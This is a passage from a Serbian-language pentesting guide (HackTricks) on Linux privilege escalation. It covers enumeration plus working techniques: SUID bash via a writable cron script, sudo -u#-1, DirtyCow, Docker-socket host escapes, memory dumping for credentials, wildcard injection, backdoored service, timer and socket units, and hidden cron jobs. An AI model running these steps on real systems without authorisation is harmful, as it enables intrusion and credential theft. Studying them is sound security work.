# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo sa prikupljanjem informacija o pokrenutom operativnom sistemu
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ako imate **write permissions** na bilo kojem folderu unutar promenljive `PATH`, možda ćete moći da hijack some libraries or binaries:
```bash
echo $PATH
```
### Env info

Ima li zanimljivih informacija, passwords ili API keys u environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite kernel verziju i postoji li exploit koji se može iskoristiti za escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar spisak ranjivih kernel verzija i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi na kojima možete naći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive kernel verzije sa te stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći u pretrazi kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvršiti NA žrtvi, proverava samo exploits za kernel 2.x)

Uvek **pretraži kernel verziju na Google**, možda je tvoja kernel verzija pomenuta u nekom kernel exploitu i tada ćeš biti siguran da je taj exploit validan.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: verifikacija potpisa nije uspela

Pogledaj **smasher2 box of HTB** za **primer** kako bi se ova vuln mogla iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dodatna enumeracija sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojte moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite unutar docker kontejnera, možete pokušati da pobegnete iz njega:


{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **šta je mounted i unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount-ujete i proverite ima li privatnih informacija.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabrojte korisne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je **instaliran bilo koji kompajler**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara Nagios verzija (na primer) koja bi mogla biti iskorišćena za escalating privileges…\
Preporučuje se ručno proveriti verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete koristiti **openVAS** da proverite zastareli i ranjiv softver instaliran na toj mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, zato se preporučuju aplikacije poput OpenVAS ili slične koje će proveriti da li je bilo koja instalirana verzija softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji se procesi** izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite da li su mogući [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detektuje ih proverom `--inspect` parametra u komandnoj liniji procesa.\
Takođe **proverite svoje privilegije nad binarnim fajlovima procesa**, možda možete prepisati neki.

### Praćenje procesa

Možete koristiti alate poput [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Memorija procesa

Neki servisi na serveru čuvaju **podatke za prijavu u čistom tekstu u memoriji**.\
Obično će vam trebati **root privileges** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, stoga je ovo obično korisnije kada ste već root i želite otkriti više podataka za prijavu.\
Međutim, imajte na umu da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Ako imate pristup memoriji FTP servisa (na primer) možete dobiti Heap i pretražiti u njemu podatke za prijavu.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati PID, **maps prikazuju kako je memorija mapirana u** virtuelnom adresnom prostoru tog procesa; takođe prikazuju **dozvole svake mapirane regije**. Pseudo-fajl **mem** **otkriva samu memoriju procesa**. Iz **maps** fajla znamo koje su **memorijske regije čitljive** i njihovi offseti. Koristimo ove informacije da **seek u mem fajlu i dump-ujemo sve čitljive regije** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` pruža pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti pomoću /dev/kmem.\
Obično je `/dev/mem` čitljiv samo od strane **root** i **kmem** grupe.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za linux

ProcDump je reinterpretacija klasičnog ProcDump alata iz Sysinternals paketa alata za Windows, namenjena za Linux. Preuzmite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump a process memory možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti root zahteve i dumpovati process koji je u vašem vlasništvu
- Script A.5 iz [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je potreban)

### Kredencijali iz Process Memory

#### Ručni primer

Ako otkrijete da authenticator process radi:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump the process (pogledajte prethodne sekcije da pronađete različite načine da dump the memory of a process) i potražiti kredencijale unutar memorije:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti nešifrovane kredencijale iz memorije** i iz nekih **dobro poznatih fajlova**. Za ispravan rad zahteva root privilegije.

| Funkcija                                          | Ime procesa          |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)         | apache2              |
| OpenSSH (aktivne SSH sesije - korišćenje sudo)    | sshd:                |

#### Pretraga Regex-a/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron jobs

Proverite da li je neki zakazani job ranjiv. Možda možete iskoristiti skriptu koja se izvršava kao root (wildcard vuln? možete li menjati fajlove koje root koristi? use symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, u _/etc/crontab_ možete pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju da korisnik "user" ima pravo pisanja nad /home/user_)

Ako u ovom crontabu root pokušava da izvrši neku komandu ili skriptu bez podešavanja PATH-a. На пример: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ako skripta koju izvršava root sadrži “**\***” unutar komande, možete to iskoristiti za izvršavanje neočekivanih stvari (poput privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard deo putanje kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **).**

Pročitajte sledeću stranicu za više trikova za eksploataciju wildcard-a:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron: prepisivanje skripte i symlink

Ako **možete izmeniti cron skriptu** koju izvršava root, možete vrlo lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju izvršava root koristi **direktorijum na koji imate potpuni pristup**, možda bi bilo korisno obrisati taj direktorijum i **napraviti symlink ka drugom direktorijumu** koji pokreće skriptu pod vašom kontrolom.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Česti cron jobs

Možete pratiti procese da biste pronašli procese koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti i escalate privileges.

Na primer, da biste **nadgledali svakih 0.1s tokom 1 minute**, **sortirali po najmanje izvršenim komandama** i obrisali komande koje su se najviše izvršavale, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i navesti svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je kreirati cronjob **stavljanjem povratka karetke nakon komentara** (bez znaka novog reda), i cron job će raditi. Primer (obratite pažnju na karakter povratka karetke):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Fajlovi _.service_ koji se mogu pisati

Proverite da li možete da upišete bilo koji `.service` fajl, ako možete, vi **možete ga izmeniti** tako da on **pokreće** vaš **backdoor kada** je servis **pokrenut**, **restartovan** ili **zaustavljen** (možda ćete morati da sačekate da se mašina restartuje).\
Na primer kreirajte vaš backdoor unutar `.service` fajla sa **`ExecStart=/tmp/script.sh`**

### Binarni fajlovi servisa koji su upisivi

Imajte na umu da ako imate **dozvole za pisanje nad binarnim fajlovima koje izvršavaju servisi**, možete ih izmeniti da sadrže backdoors, tako da kada se servisi ponovo izvrše ti backdoors budu izvršeni.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkrijete da možete **pisati** u bilo kom od direktorijuma na putanji, možda ćete moći da **escalate privileges**. Treba da tražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **executable** sa **istim imenom kao relativni path binary** unutar systemd PATH foldera u koji možete pisati, i kada servis bude zatražen da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu da startuju/stopuju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima sa `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čije ime se završava na `**.timer**` koji kontrolišu `**.service**` fajlove ili događaje. **Timers** mogu da se koriste kao alternativa cron-u jer imaju ugrađenu podršku za kalendarske vremenske događaje i monotoničke vremenske događaje i mogu se pokretati asinhrono.

Možete izlistati sve timere sa:
```bash
systemctl list-timers --all
```
### Tajmeri sa pravom za pisanje

Ako možete izmeniti tajmer, možete ga naterati da pokrene neku postojeću systemd.unit (npr. `.service` ili `.target`).
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja se aktivira kada ovaj timer istekne. Argument je naziv unit-a, čiji sufiks nije ".timer". Ako nije naveden, ova vrednost podrazumevano pokazuje na service koji ima isto ime kao timer unit, osim sufiksa. (Vidi gore.) Preporučuje se da naziv unit-a koji se aktivira i naziv timer unit-a budu identični, osim sufiksa.

Dakle, da biste zloupotrebili ovu dozvolu, potrebno je da:

- Pronađete neki systemd unit (npr. `.service`) koji **izvršava binarni fajl u koji imate permisiju za pisanje**
- Pronađete neki systemd unit koji **izvršava relativnu putanju** i imate **dozvole za pisanje** nad **systemd PATH** (da biste podmetnuli taj izvršni fajl)

**Više o timer-ima saznajte u `man systemd.timer`.**

### **Omogućavanje timera**

Da biste omogućili timer, potrebne su root privilegije i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Imajte na umu da se **timer** **aktivira** kreiranjem symlink-a ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketi

Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istoj ili različitim mašinama unutar client-server modela. Koriste standardne Unix descriptor fajlove za međuračunarsku komunikaciju i konfigurišu se preko `.socket` fajlova.

Sockets mogu biti konfigurisani koristeći `.socket` fajlove.

**Saznajte više o sockets sa `man systemd.socket`.** U ovom fajlu može se podesiti nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali suštinski služe da **naznače gde će se slušati** socket (putanja AF_UNIX socket fajla, IPv4/6 i/ili broj porta koji će se slušati, itd.)
- `Accept`: Prima boolean argument. Ako je **true**, za **svaku dolaznu konekciju se pokreće instance servisa** i samo konekcioni socket se prosleđuje toj instanci. Ako je **false**, svi listening soketi sami po sebi se **prosleđuju startovanom service unit-u**, i samo jedna service unit se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sokete i FIFO-e gde jedna service unit bezuslovno rukuje celim dolaznim saobraćajem. **Podrazumevano je false**. Iz razloga performansi, preporučuje se pisati nove daemone na način pogodan za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prima jednu ili više komandnih linija, koje se **izvršavaju pre** ili **posle** nego što su listening **soketi**/FIFO-i **kreirani** i vezani, redom. Prvi token komandne linije mora biti apsolutno ime fajla, a zatim argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** nego što su listening **soketi**/FIFO-i **zatvoreni** i uklonjeni, redom.
- `Service`: Specificira ime **service** unit-a **koji će se aktivirati** na **dolazni saobraćaj**. Ova opcija je dozvoljena samo za sokete sa Accept=no. Podrazumevano pokazuje na service koji nosi isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva nije neophodno koristiti ovu opciju.

### Upisivi .socket fajlovi

Ako pronađete **upisiv** `.socket` fajl možete **dodati** na početku `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što socket bude kreiran. Dakle, **verovatno ćete morati da sačekate dok se mašina ne restartuje.**\
_Napomena: sistem mora koristiti tu konfiguraciju socket fajla ili backdoor neće biti izvršen_

### Upisivi Unix soketi

Ako **identifikujete bilo koji upisiv socket** (_sada govorimo o Unix Sockets i ne o konfig `.socket` fajlovima_), onda **možete komunicirati** sa tim socketom i možda iskoristiti neku ranjivost.

### Enumeracija Unix soketa
```bash
netstat -a -p --unix
```
### Sirova konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets listening for HTTP** zahteva (_Ne mislim na .socket files već na fajlove koji se ponašaju kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovori na HTTP** zahtev, onda možete **komunicirati** sa njim i možda **iskoristiti neku ranjivost**.

### Upisivi Docker socket

Docker socket, često se nalazi na `/var/run/docker.sock`, je kritičan fajl koji treba da bude zaštićen. Po defaultu, može da mu piše `root` korisnik i članovi `docker` grupe. Imati pristup za pisanje ovom socketu može dovesti do eskalacije privilegija. Evo pregleda kako se to može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Eskalacija privilegija pomoću Docker CLI**

Ako imate pristup za pisanje Docker socketu, možete eskalirati privilegije koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete container sa root pristupom fajl-sistemu hosta.

#### **Korišćenje Docker API-ja direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati pomoću Docker API-ja i `curl` komandi.

1.  **List Docker Images:** Dohvatite listu dostupnih images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje containera koji mount-uje root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju ka containeru, što vam omogućava izvršavanje komandi u njemu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete izvršavati komande direktno u containeru sa root pristupom fajl-sistemu hosta.

### Ostalo

Imajte na umu da ako imate write permissions over the docker socket zato što ste **inside the group `docker`** imate [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ako je [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Proverite **još načina da se izvučete iz docker-a ili da ga zloupotrebite za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran **sistem za međuprocesnu komunikaciju (IPC)** koji omogućava aplikacijama efikasnu interakciju i razmenu podataka. Dizajniran sa savremenim Linux sistemom na umu, nudi robusni okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržava osnovnu IPC koja poboljšava razmenu podataka između procesa, podsećajući na **enhanced UNIX domain sockets**. Pored toga, pomaže u emitovanju događaja ili signala, omogućavajući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolazećem pozivu može naterati plejer da utiša zvuk, poboljšavajući korisničko iskustvo. Takođe, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve servisa i pozive metoda između aplikacija, što pojednostavljuje procese koji su tradicionalno bili složeni.

D-Bus radi na modelu **allow/deny**, upravljajući dozvolama poruka (pozivi metoda, emitovanje signala itd.) na osnovu kumulativnog efekta podudarnih pravila politike. Ove politike određuju interakcije sa bus-om, potencijalno dozvoljavajući eskalaciju privilegija kroz zloupotrebu tih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je dat, i prikazuje dozvole za korisnika root da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe važe univerzalno, dok "default" kontekst politike važe za sve koji nisu obuhvaćeni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da enumerate i exploit D-Bus komunikaciju ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo da enumerate mrežu i odredite poziciju mašine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Uvek proverite mrežne servise koji rade na mašini sa kojima niste mogli da komunicirate pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete sniff traffic. Ako možete, možda ćete moći da dohvatite neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Opšta enumeracija

Proverite **who** ste, koje **privileges** imate, koji **users** su u sistemu, koji mogu da **login** i koji imaju **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke verzije Linux-a su bile pogođene greškom koja omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proverite da li se u međuspremniku nalazi nešto zanimljivo (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** iz okruženja, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta stvaranje puno buke i `su` i `timeout` binari su prisutni na računaru, možete pokušati da brute-force-ujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava da brute-force-uje korisnike.

## Zloupotrebe upisivog $PATH

### $PATH

